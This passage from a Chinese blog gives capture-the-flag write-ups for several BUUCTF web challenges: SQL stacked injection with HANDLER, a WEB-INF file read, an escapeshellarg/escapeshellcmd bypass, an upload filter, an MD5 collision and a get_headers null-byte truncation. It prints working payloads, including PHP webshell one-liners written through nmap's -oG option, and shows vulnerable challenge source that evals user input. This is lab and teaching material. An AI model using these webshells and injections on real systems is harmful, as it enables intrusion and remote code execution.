class="keyword">for</span> i <span class="keyword">in</span> tqdm(files):                                                            <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>

<h3 id="二十四、-GYCTF2020-Blacklist"><a href="#二十四、-GYCTF2020-Blacklist" class="headerlink" title="二十四、[GYCTF2020]Blacklist"></a>二十四、[GYCTF2020]Blacklist</h3><p>​    堆叠注入，单引号闭合原语句后，show tables发现Flag，使用handler绕过过滤。</p>
<p>Payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://70b76899-8425-4841-8679-f627f09be900.node3.buuoj.cn/?inject=-1&#x27;;<span class="keyword">handler</span> <span class="string">`FlagHere`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`FlagHere`</span> <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;ef4945b0-741f-4b3d-af3e-357b17cebb6c&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十五、-RoarCTF-2019-Easy-Java"><a href="#二十五、-RoarCTF-2019-Easy-Java" class="headerlink" title="二十五、[RoarCTF 2019]Easy Java"></a>二十五、[RoarCTF 2019]Easy Java</h3><p>​    准确点说是一道信息泄露题。</p>
<p>​    1、help页面url中存在filename参数，改为POST参数发现该接口可读取文件</p>
<p>​    2、尝试读取WEB-INF/web.xml</p>
<p>​    3、审计web.xml发现存在com.wm.ctf.FlagController</p>
<p>​    4、直接读class文件，WEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>​    5、打开发现base64编码后的flag</p>
<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f27f3b6b<span class="number">-84</span>b7<span class="number">-4</span>b4d-a923<span class="number">-5</span>d3f178f87b6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十六、-BUUCTF-2018-Online-Tool"><a href="#二十六、-BUUCTF-2018-Online-Tool" class="headerlink" title="二十六、[BUUCTF 2018]Online Tool"></a>二十六、[BUUCTF 2018]Online Tool</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a>——来自洞悉漏洞论坛，作者：Hcamael, p0wd3r</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞</a>——作者：Phithon</p>
</blockquote>
<h4 id="重点函数："><a href="#重点函数：" class="headerlink" title="重点函数："></a><strong>重点函数：</strong></h4><p>​    escapeshellarg()：1、给输入的参数两侧加上一个单引号。2、对参数中的单引号进行转义。3、给转义后的单引号两边再加上一对单引号。</p>
<p>​    <a target="_blank" rel="noopener" href="https://imgchr.com/i/DM9L5V"><img src="https://s3.ax1x.com/2020/11/19/DM9L5V.png" alt="DM9L5V.png"></a></p>
<p>​    escapeshellcmd()：转义shell中的一些特殊符号，单引号和双引号成对时不转义，单引号和双引号的成对情况的判断方法是从左至右依次匹配。</p>
<p>​    <a target="_blank" rel="noopener" href="https://imgchr.com/i/DMCpr9"><img src="https://s3.ax1x.com/2020/11/19/DMCpr9.png" alt="DMCpr9.png"></a></p>
<h4 id="Shell中的重点基础知识："><a href="#Shell中的重点基础知识：" class="headerlink" title="Shell中的重点基础知识："></a><strong>Shell中的重点基础知识：</strong></h4><p>​     1、’’ 相当于空格</p>
<p>​    2、单引号和双引号：’’中的内容只会被当作普通的字符串;“”中的内容允许使用变量等内容，因此一些特殊符号需要被打印时需要转义。（比较像PHP）</p>
<p>​    3、linux中文件名出现单引号时，为了便于人观看，会自动给文件名两边加上双引号。</p>
<p>​    4、linux中文件名出现特殊符号时，为了便于人观看，会自动给文件名两边加上单引号。</p>
<p>​        <a target="_blank" rel="noopener" href="https://imgchr.com/i/DMPykt"><img src="https://s3.ax1x.com/2020/11/19/DMPykt.png" alt="DMPykt.png"></a></p>
<p>​    5、命令行参数传递错误时，有时不会影响后续参数的解析。</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span></span><br><span class="line"><span class="string">&#x27; -oG 1.php &lt;?php eval($_POST[&quot;a&quot;]);?&gt;</span></span><br><span class="line"><span class="string">&#x27;</span> -oG <span class="number">1.</span>php <span class="meta">&lt;?=</span>`$_REQUEST[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3484494e-44</span>a7<span class="number">-48</span>d4-a6a2<span class="number">-7</span>ce586a6072d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十七、-MRCTF2020-你传你🐎呢"><a href="#二十七、-MRCTF2020-你传你🐎呢" class="headerlink" title="二十七、[MRCTF2020]你传你🐎呢"></a>二十七、[MRCTF2020]你传你🐎呢</h3><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5((<span class="keyword">string</span>)time() . (<span class="keyword">string</span>)rand(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    $target_path  = getcwd() . <span class="string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    $t_path = $target_path . <span class="string">&quot;/&quot;</span> . basename($_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $uploaded_name = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    $uploaded_tmp  = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            $content = file_get_contents($uploaded_tmp);</span><br><span class="line">            mkdir(iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, $target_path), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            move_uploaded_file($uploaded_tmp, $t_path);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&#123;$t_path&#125; succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php.ini位置：/usr/local/etc/php/php.ini</p>
<p><strong>disable_functions</strong>=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</p>
<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">04e65838</span>-e421<span class="number">-4</span>cb7<span class="number">-97</span>f2-e908b1b214d9&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h3><p>​    参考上面真实md5碰撞Payload + PHP弱类型绕过</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;gg=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line"></span><br><span class="line">passwd=<span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">740</span>dbefb<span class="number">-3</span>a86<span class="number">-4587</span><span class="number">-91</span>a0<span class="number">-30e6</span>af21090c&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十九、CVE-2020-7066"><a href="#二十九、CVE-2020-7066" class="headerlink" title="二十九、CVE-2020-7066"></a>二十九、CVE-2020-7066</h3><blockquote>
<p>In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</p>
</blockquote>
<p>get_header %00截断。</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http:<span class="comment">//127.0.1.123%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">57</span>da89d5<span class="number">-4730</span><span class="number">-4</span>ef0<span class="number">-867e-31</span>ec00306254&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三十、"><a href="#三十、" class="headerlink" title="三十、"></a>三十、</h3><p>​    这道题简单Fuzz了一下发现.git源码泄露，使用王一航大佬的<a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">GitHacker</a>发现有字符异常终止错误。换了一个<a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">scrabble</a>脚本直接获得源码index.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


                


<p class="pink-link-context">
    <a href="/2020/11/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/CVE-2017-12149JBoss-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="CVE-2017-12149JBoss 反序列化漏洞利用">
    下一篇：CVE-2017-12149JBoss 反序列化漏洞利用
  </a>
</p>


            </div>
			
        </div>
    </div>
</article>






</div>

        <div class="fixed-action-btn float-sitemap">
    <a class="btn-floating btn-large pink">
      <i class="fa fa-caret-square-o-up"></i>
    </a>
    <ul>
      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
    </ul>
  </div>

    </main>
    <footer class="page-footer indigo darken-1">
    
    <div class="footer-container container">
        <div class="row">
            
            <div class="social-group col m4 s12">
                <h5 class="white-text">社交</h5>
                
                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
                        <i class="fa fa-2x fa-weibo"></i>
                    </a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
                        <i class="fa fa-2x fa-github"></i>
                    </a>
                
                    <a class="social-link" href="/atom.xml" target="_blank">
                        <i class="fa fa-2x fa-rss"></i>
                    </a>
                
                

            </div>
            

            
            <div class="col m8 s12">
                <h5 class="white-text">友情链接</h5>
                
                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
                
            </div>
            
        </div>
    </div>
    

    <div class="footer-copyright pink-link-context">
        <div class="container">
            © 2016 example.com, All rights reserved.
            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
        </div>
    </div>
</footer>


    <noscript>
    <div class="noscript">
        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
    </div>
</noscript>
<div class="noscript">
    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
</div>


<script src="/js/jquery.min.js"></script>
<script src="/js/materialize.min.js"></script>

<script>
    (function($) {
        $(document).ready(function() {
            // 隐藏禁用javascript（针对微信内置浏览器）的提示
            $('.noscript').hide();

            // 图片缩放效果
            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');

            // 给图片加上点击放大效果（materialbox插件）
            $imgs.addClass('materialboxed').each(function(i, el) {
                $(this).attr('data-caption', $(this).attr('alt') || ' ');
            }).materialbox();

            // 优化表格的显示
            $('table').each(function() {
                var $table = $(this);
                // 除去多行代码的情况
                if ($table.find('pre').length == 0) {
                    $table.addClass('responsive-table striped bordered');
                }
            });

            // 首页幻灯片
            $('.slider').slider({indicators: true, full_width: true, interval: 8000});

            $(".button-collapse").sideNav();
            $(".category-menu").sideNav();

            // 针对gallery post
            $('.carousel').carousel({full_width: true});
            $('.carousel-control.prev').click(function() {
                $('.carousel').carousel('prev');
            });
            $('.carousel-control.next').click(function() {
                $('.carousel').carousel('next');
            });

            // 文章目录
            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();

            // 目录随屏幕滚动（防止目录过长越过footer）
            var $toc = $('.toc');
            var scrollTargetTop = 0;
            $(window).scroll(function() {
                var $activeLink = $toc.find('a.active.section');
                if ($(window).scrollTop() < 100) {
                    scrollTargetTop = 0;
                } else {
                    if ($activeLink[0]) {
                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
                    }
                }
                $toc.css('top', '-' + scrollTargetTop + 'px');
            });

            // 修正文章目录的left-border颜色
            var color = $('.table-of-contents-text').css('color');
            $('.table-of-contents-link').css('border-left-color', color);

            // 针对移动端做的优化：FAB按钮点击一下收回
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                $('.fixed-action-btn').addClass('click-to-toggle');
            }
            // 回到顶部
            $('.btn-return-top').click(function() {
                $('body, html').animate({
                    scrollTop: 0
                }, 500);
            });

            // 重置读书页面的Tab标签页的颜色
            $('li.tab a').hover(function() {
                $(this).toggleClass('text-lighten-4');
            });
            $('.indicator').addClass('pink lighten-2');

            
            // 添加new标签
            $('').append('<span class="new badge pink"></span>');
            

            // 搜索功能
            $('.modal-trigger').leanModal({
                // 打开搜索框时自动聚焦
                ready: function() {
                    if ($('#search').is(":visible")) {
                        $('#search-input').focus();
                    }
                }
            });
            var searchXml = "search.xml";
            if (searchXml.length == 0) {
             	searchXml = "search.xml";
            }
            var searchPath = "/" + searchXml;
            initSearch(searchPath, 'search-input', 'search-result');
        });

        // 初始化搜索与匹配函数
        var initSearch = function(path, search_id, content_id) {
            'use strict';
            $.ajax({
                url: path,
                dataType: "xml",
                success: function(xmlResponse) {
                    // get the contents from search data
                    var datas = $("entry", xmlResponse).map(function() {
                        return {
                            title: $("title", this).text(),
                            content: $("content", this).text(),
                            url: $("url", this).text()
                        };
                    }).get();
                    var $input = document.getElementById(search_id);
                    var $resultContent = document.getElementById(content_id);
                    $input.addEventListener('input', function() {
                        var str = '<ul class=\"search-result-list\">';
                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                        $resultContent.innerHTML = "";
                        if (this.value.trim().length <= 0) {
                            return;
                        }
                        // perform local searching
                        datas.forEach(function(data) {
                            var isMatch = true;
                            var content_index = [];
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty titles and contents
                            if (data_title != '' && data_content != '') {
                                keywords.forEach(function(keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);
                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            }
                            // show search results
                            if (isMatch) {
                                keywords.forEach(function(keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                });

                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 100 characters
                                    var start = first_occur - 20;
                                    var end = first_occur + 80;
                                    if (start < 0) {
                                        start = 0;
                                    }
                                    if (start == 0) {
                                        end = 100;
                                    }
                                    if (end > content.length) {
                                        end = content.length;
                                    }
                                    var match_content = content.substring(start, end);
                                    // highlight all keywords
                                    keywords.forEach(function(keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                    });

                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        $resultContent.innerHTML = str;
                    });
                }
            });
        }
    })(jQuery);
</script>


<script src="/js/prettify.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("pre").addClass("prettyprint");
        prettyPrint();
    });
</script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript" async
  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>



</body>
</html>
